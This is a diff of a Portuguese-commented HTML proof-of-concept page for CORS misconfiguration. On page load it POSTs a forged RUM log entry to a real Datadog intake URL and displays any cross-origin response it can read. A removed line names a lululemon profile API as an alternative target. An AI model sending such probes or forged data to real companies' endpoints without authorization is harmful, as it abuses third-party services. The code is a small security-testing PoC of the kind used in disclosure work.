@@ -1,50 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>POC de Exploração de CORS Incorreto</title>
+    <title>POC de Exploração de CORS Incorreto - POST Method</title>
 </head>
 <body>
-    <h1>Prova de Conceito (POC) - Leitura de Resposta Cross-Origin</h1>
+    <h1>Prova de Conceito (POC) - Leitura de Resposta Cross-Origin (POST)</h1>
     
-    <p>O script abaixo tenta fazer uma requisição para o endpoint alvo e exibir a resposta.</p>
+    <p>Este script envia uma requisição POST com um payload simples para o endpoint alvo, visando
+       demonstrar que a resposta (mesmo que seja um erro ou confirmação) pode ser lida
+       pelo domínio do invasor devido ao cabeçalho <code>Access-Control-Allow-Origin: *</code>.</p>
     
     <script>
-        // URL VULNERÁVEL (Use o endpoint que retorna dados que você quer ler)
-        // Usaremos a URL mencionada como exemplo de requisição:
+        // URL VULNERÁVEL (O endpoint que retorna Access-Control-Allow-Origin: *)
         const VULNERABLE_URL = 'https://browser-intake-datadoghq.com/api/v2/rum?ddsource=browser&dd-api-key=pub75ad0c3b08ce2dd249e3dba1791bca84&dd-evp-origin-version=6.22.0&dd-evp-origin=browser&dd-request-id=5ad94e5a-ec5c-4525-b732-7af8232bacd3&batch_time=1761064984867&_dd.api=fetch-keepalive'; 
 
-        // Endpoint de exemplo que pode retornar dados legíveis (se o primeiro não retornar dados úteis)
-        // const VULNERABLE_URL = 'https://shop.lululemon.com/api/dataenablement/profile'; 
+        // Payload de dados que o endpoint de RUM espera (dados mínimos/simulados)
+        const PAYLOAD = JSON.stringify({
+            "rum": [
+                {
+                    "date": Date.now(),
+                    "message": "POC - CORS Read Attempt via POST",
+                    "status": "info"
+                }
+            ]
+        });
 
         document.addEventListener('DOMContentLoaded', () => {
-            fetch(VULNERABLE_URL)
-                .then(response => {
-                    // Verifica se a requisição foi bem-sucedida
-                    if (response.ok) {
-                        return response.text(); // Lê a resposta como texto
-                    } else {
-                        throw new Error('Falha na requisição: ' + response.statusText);
-                    }
-                })
-                .then(data => {
-                    // Esta parte é a **PROVA DA VULNERABILIDADE**
-                    // Se a resposta for lida e exibida, o CORS está incorreto.
-                    document.getElementById('status').innerText = 'SUCESSO: Resposta Cross-Origin Lida!';
-                    document.getElementById('response-data').innerText = data;
-                    console.log('Dados Lidos:', data);
-                })
-                .catch(error => {
-                    document.getElementById('status').innerText = 'FALHA: ' + error.message;
-                    document.getElementById('response-data').innerText = 'Verifique o console para detalhes. Se a falha for CORS, o erro não aparecerá aqui, mas sim no Console do navegador (o que prova a proteção). Se o erro for outro (ex: 404), a POC foi enviada com sucesso mas o endpoint não retornou dados.';
-                    console.error('Erro de POC:', error);
-                });
+            fetch(VULNERABLE_URL, {
+                method: 'POST', // Método adaptado
+                // Incluindo cabeçalhos essenciais para requisições JSON/POST
+                headers: {
+                    'Content-Type': 'application/json' 
+                },
+                body: PAYLOAD // Envia os dados
+            })
+            .then(response => {
+                // A vulnerabilidade é provada se a resposta for lida aqui. 
+                // O status de sucesso (2xx) ou falha de aplicativo (4xx/5xx) não importa, 
+                // desde que a leitura da resposta seja permitida.
+                if (response.status !== 0) { 
+                    document.getElementById('status').innerText = `SUCESSO: Resposta Cross-Origin Lida! (Status: ${response.status} ${response.statusText})`;
+                    return response.text();
+                } else {
+                     // Caso raro de falha de rede/protocolo que não é 405
+                    throw new Error('Falha na requisição: Status 0 (Possível erro de rede ou política do navegador)');
+                }
+            })
+            .then(data => {
+                // EXIBIÇÃO DOS DADOS LIDOS: A prova final da exploração.
+                document.getElementById('response-data').innerText = data || "Resposta vazia ou de sucesso (200/202).";
+                console.log('Dados Lidos:', data);
+            })
+            .catch(error => {
+                // O erro de CORS NÃO APARECERÁ AQUI. Se o erro for outro (ex: 405/404),
+                // o servidor foi alcançado, mas rejeitou a requisição por motivo de aplicativo.
+                document.getElementById('status').innerText = 'FALHA DE REDE/SCRIPT: ' + error.message;
+                console.error('Erro de POC:', error);
+            });
         });
     </script>
     
     <h2>Status da Exploração:</h2>
-    <p id="status">Tentando buscar dados...</p>
+    <p id="status">Tentando fazer requisição POST e ler a resposta...</p>
     
-    <h2>Dados da Resposta Lidos:</h2>
+    <h2>Resposta Lida (Conteúdo do Corpo HTTP):</h2>
     <pre id="response-data" style="border: 1px solid #ccc; padding: 10px; white-space: pre-wrap; background-color: #f9f9f9;">Aguardando resposta...</pre>
     
 </body>
